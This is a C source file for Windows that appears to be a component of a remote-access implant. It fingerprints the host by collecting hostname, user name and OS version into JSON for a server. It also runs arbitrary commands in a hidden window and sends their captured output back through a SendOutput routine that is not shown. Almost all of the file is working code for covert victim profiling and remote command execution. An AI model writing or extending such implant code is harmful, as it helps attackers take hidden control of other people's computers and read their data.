#include <rpc.h>
#include <Lmcons.h>
#include "utils.h"

#pragma comment(lib, "Rpcrt4.lib")      // for GenerateUUID()
#pragma comment(lib, "advapi32.lib")    // for GetSystemInfo()

// Generate UUID
void GenerateUUID(char *uuidStr, size_t maxLen) {
    UUID uuid;
    RPC_CSTR szUuid = NULL;
    if (UuidCreate(&uuid) == RPC_S_OK && UuidToStringA(&uuid, &szUuid) == RPC_S_OK) {
        snprintf(uuidStr, maxLen, "%s", szUuid);
        RpcStringFreeA(&szUuid);
    } else {
        snprintf(uuidStr, maxLen, "uuid_error");
    }
}

// Get system info for JSON POST to server
void GetSystemInfoForServer(char *jsonOut, size_t len) {
    char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD hostlen = sizeof(hostname);
    GetComputerNameA(hostname, &hostlen);

    char username[UNLEN + 1] = {0};
    DWORD userlen = sizeof(username);
    GetUserNameA(username, &userlen);

    OSVERSIONINFOEXA osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    GetVersionExA((OSVERSIONINFOA*)&osvi);

    snprintf(jsonOut, len,
        "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"Windows %d.%d Build %d\"}",
        hostname, username, osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
}

void ExecuteCommandWrapper(const char *cmd) {
    ExecuteWindowsCommand(cmd);
}

// Execute shell command and capture output
void ExecuteWindowsCommand(const char *cmd) {
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hRead, hWrite;
    CreatePipe(&hRead, &hWrite, &sa, 0);

    PROCESS_INFORMATION pi;
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    BOOL success = CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (!success) {
        SendOutput("Failed to execute command");
        return;
    }

    CloseHandle(hWrite);  // Only read end needed now

    char buffer[8192] = {0};
    DWORD read = 0, total = 0;
    char output[16384] = {0};

    while (ReadFile(hRead, buffer, sizeof(buffer)-1, &read, NULL) && read > 0) {
        buffer[read] = '\0';
        strncat(output, buffer, sizeof(output) - strlen(output) - 1);
        total += read;
        if (total >= sizeof(output) - 1) break;  // Prevent overflow
        Sleep(10);  // Let the buffer fill if needed
    }

    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (strlen(output) == 0) {
        SendOutput("(no output)");
    } else {
        SendOutput(output);
    }
}
